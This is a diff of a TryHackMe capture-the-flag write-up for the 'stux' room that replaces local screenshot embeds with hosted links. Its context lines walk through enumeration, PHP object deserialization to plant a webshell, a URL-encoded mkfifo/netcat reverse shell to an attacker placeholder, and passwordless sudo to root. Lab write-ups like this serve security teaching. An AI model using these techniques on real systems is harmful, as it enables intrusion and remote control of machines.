@@ -4,7 +4,7 @@ date: 2025-03-02
 categories: [TryHackMe]
 tags: [web, linux, enumeration, ssrf, ssti, rabbitmq, medium]
 ---
-
+![Image](https://github.com/user-attachments/assets/fa31639d-0da5-4b54-adb9-cc160d445feb)
 
 Crypto, serealization, priv scalation and more ...!
 
@@ -19,7 +19,7 @@ To start, we add the target's IP address to our `/etc/hosts` file and perform a 
 nmap 10.10.53.93 -sV -sC -p- -oN nmapres
 ```
 
-![[Capture d'écran 2025-03-16 111130.png]]
+![Image](https://github.com/user-attachments/assets/70599491-f2f7-4e90-9e6b-3889bb4609c2)
 
 The scan reveals two open ports :
 
@@ -28,23 +28,23 @@ The scan reveals two open ports :
 
 Next, we can perform a directory enumeration using `gobuster`.
 
-![[Capture d'écran 2025-03-16 111854.png]]
+![Image](https://github.com/user-attachments/assets/eab51530-89fe-426f-bee4-625499160e82)
 
 The scan reveals that we can only access `http://stux.thm:80`.
 
 We can continue enumerating with a `dirsearch` scan.
 
-![[Capture d'écran 2025-03-16 113735.png]]
+![Image](https://github.com/user-attachments/assets/75676008-efaa-4a7a-b5d9-be13fd8d99c2)
 
 The scan reveals a `robots.txt` file.
 
 Let's check the web page at `http://stux.thm:80`.
 
-![[Capture d'écran 2025-03-16 114327.png]]
+![Image](https://github.com/user-attachments/assets/eedc0410-24c8-4ec9-9325-c192d2b91f91)
 
 It seems that we cannot find any relevant information on the page itself. However, if we check the **View Page Source**, we can uncover some interesting details.
 
-![[Capture d'écran 2025-03-16 115035.png]]
+![Image](https://github.com/user-attachments/assets/7d64e5c5-f7a5-4ee9-906b-befa795061fb)
 This reveals the following strings  : 
 
 - p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251;
@@ -57,7 +57,7 @@ These appear to be cryptographic parameters that, if processed correctly, could 
 
 Upon checking the `http://stux.thm:80/robots.txt` file that we found earlier, we see that the file hints at the cryptographic algorithm we should use:
 
-![[Capture d'écran 2025-03-16 120116.png]]
+![Image](https://github.com/user-attachments/assets/66413606-8bb8-4db4-a3f2-2c87eeed8c6a)
 
 Thus, we can assume that **Diffie-Hellman** is the algorithm we need to use in order to find the secret key, which will lead us to the secret directory.
 
@@ -143,7 +143,7 @@ First 128 character : 4731502[...]855055
 
 Now we can access to the **hidden** directory with `http://stux.thm:80/4731502[...]855055`
 
-![[Capture d'écran 2025-03-16 141611.png]]
+![Image](https://github.com/user-attachments/assets/014e243a-00e4-46e8-88d4-2ce41edee92a)
 
 It worked, and we've successfully discovered the hidden directory!
 
@@ -190,7 +190,7 @@ The scan reveals that we have found the word `file` as a **GET** parameter.
 
 Additionally, upon checking the **View Page Source** again, we can spot a **hint** :
 
-![[Capture d'écran 2025-03-16 142026.png]]
+![Image](https://github.com/user-attachments/assets/e3a9ba38-b090-4835-ada8-55dd283cdaf7)
 
 Based on the `ffuf` output and the hint provided, it seems we may be able to access local files via the URL `http://stux.thm:80/4731502[...]855055/?file=`.
 
@@ -230,18 +230,18 @@ index.php               [Status: 200, Size: 6664, Words: 284, Lines: 32, Duratio
 
 We’ve just found an `index.php` file. Let’s check if we can uncover any sensitive information within it.
 
-![[Capture d'écran 2025-03-16 150334.png]]
+![Image](https://github.com/user-attachments/assets/0677738c-93fb-40a9-817e-47840f6b4200)
 
 
 Using `Burp Suite`, we discovered an output that seems to be encrypted. To decrypt it, we'll use [CyberChef](https://gchq.github.io/CyberChef/).
 
 First, we apply the `From Hex` operation, and we get a result that appears to be a `Base64` encoded message, identifiable by the `==` pattern.
 
-![[Capture d'écran 2025-03-16 150645.png]]
+![Image](https://github.com/user-attachments/assets/7aa8cf8a-2c61-4293-9fdd-277b3ae5a211)
 
 Next, we can apply the `reverse` operation followed by `From Base64` to see if we can decrypt the message.
 
-![[Capture d'écran 2025-03-16 151404.png]]
+![Image](https://github.com/user-attachments/assets/0ac75af0-9fe9-41c4-aed4-acfb5f9af3b6)
 
 After decrypting the message, we obtain the **`index.php`** source code.  
 
@@ -312,7 +312,7 @@ print(serialize(new file));
 
 Then let's execute the code :
 
-![[Capture d'écran 2025-03-16 154612.png]]
+![Image](https://github.com/user-attachments/assets/695fe43c-a0e7-4f2e-8df9-31b794cf2953)
 
 And we obtain a new serialized object for the exploit. Now, let's test if it works.
 
@@ -329,13 +329,13 @@ http://stux.thm/4731502[...]855055/?file=http://YOUR_IP:4321/output.txt
 ```
 
 
-![[Capture d'écran 2025-03-16 154834.png]]
+![Image](https://github.com/user-attachments/assets/ecabc838-b798-4c2c-8cea-216185d93e92)
 
-![[Capture d'écran 2025-03-16 154916.png]]
+![Image](https://github.com/user-attachments/assets/582dcad5-3598-4b7b-a286-b76e9b6a912a)
 
 If the exploit works as expected, the server will **deserialize our injected object**, triggering the `__destruct()` function and writing our payload to a new file on the target machine. We can navigate to `test.php` to see if the exploit worked : 
 
-![[Capture d'écran 2025-03-16 155004.png]]
+![Image](https://github.com/user-attachments/assets/a3d4d211-ea50-42c6-ac5a-8c9a87af823e)
 
 And it worked ! 
 
@@ -358,15 +358,15 @@ print(serialize(new file));
 ?>
 ```
 
-![[Capture d'écran 2025-03-16 160229.png]]
+![Image](https://github.com/user-attachments/assets/307d288d-622d-4170-9cb8-a914cdf5cef9)
 
 Now, we **repeat our previous steps** to inject the serialized payload into the target server.
 
 After making the request to unserialize the payload, our `exploit.php` file should be created on the server.
 
-![[Capture d'écran 2025-03-16 160351.png]]
+![Image](https://github.com/user-attachments/assets/74e91bc5-d789-42f4-b27d-f271a6c44224)
 
-![[Capture d'écran 2025-03-16 160407.png]]
+![Image](https://github.com/user-attachments/assets/dabeaf05-f91c-49d6-961b-41c67f7692ce)
 
 Once the webshell is in place, we can test it by visiting :
 
@@ -375,7 +375,7 @@ http://stux.thm/4731502[...]855055/exploit.php?c=whoami
 ```
 
 If the exploit works, we should see the **current user** of the target machine displayed in the response :
-![[Capture d'écran 2025-03-16 160533.png]]
+![Image](https://github.com/user-attachments/assets/e1e7be45-ea1c-417c-95dd-e743f44bf99d)
 
 It's worked, so now with command execution confirmed, we can upgrade our access to a **fully interactive reverse shell**.
 
@@ -391,7 +391,7 @@ Since this needs to be **URL-encoded**, it would look like this :
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<ATTACKER_IP>%20<ATTACKER_PORT>%20%3E%2Ftmp%2Ff
 ```
 
-![[Capture d'écran 2025-03-16 161309.png]]
+![Image](https://github.com/user-attachments/assets/7f4dac2f-b997-49d3-b79e-b146c08c9204)
 
 We start a **Netcat listener** on our attack machine :
 
@@ -407,21 +407,21 @@ http://stux.thm/4731502[...]855055/exploit.php?c=<URL_ENCODED_PAYLOAD>
 
 And we successfully establish a connection to the target machine.
 
-![[Capture d'écran 2025-03-16 161329.png]]
+![Image](https://github.com/user-attachments/assets/9d23a1fa-932f-4593-aa22-1048b7358b1a)
 
 --- 
 ### User flag 
 
 Now that we have access, our next step is to retrieve the user flag.
 
-![[Capture d'écran 2025-03-16 161650.png]]
+![Image](https://github.com/user-attachments/assets/18db29f4-12cd-4aee-aaf5-974fb32e1565)
 
 --- 
 ### Recon 3 
 
 Now, let's enumerate the system to better understand the environment and identify any vulnerabilities or misconfigurations that could lead us to the **root** flag.
 
-![[Capture d'écran 2025-03-16 162133.png]]
+![Image](https://github.com/user-attachments/assets/706a1447-4842-4fc2-ba23-dd592a4bbdd1)
 
 The output of the `sudo -l` command reveals that the `www-data` user has permission to execute any command as root **without requiring a password**. A critical misconfiguration that we can exploit...
 
@@ -430,14 +430,14 @@ The output of the `sudo -l` command reveals that the `www-data` user has permiss
 
 With root access obtained, we can now retrieve the **root flag** :
 
-![[Capture d'écran 2025-03-16 162543.png]]
+![Image](https://github.com/user-attachments/assets/94dc664d-9200-4d9a-aef9-29f5e20f488a)
 
 --- 
 ### Root flag 
 
 Finally, we can now read the **root flag** :
 
-![[Capture d'écran 2025-03-16 162701.png]]
+![Image](https://github.com/user-attachments/assets/e1e9bca1-fb5c-4536-83ff-98dadd898a2f)
 
 --- 
 
@@ -445,5 +445,5 @@ Finally, we can now read the **root flag** :
 
 Thanks for reading, and happy hacking!
 
-![[Capture d'écran 2025-03-16 162955.png]]
+![Image](https://github.com/user-attachments/assets/2b622fb3-9d90-4c6f-ba07-e9da3ac9a76a)
 
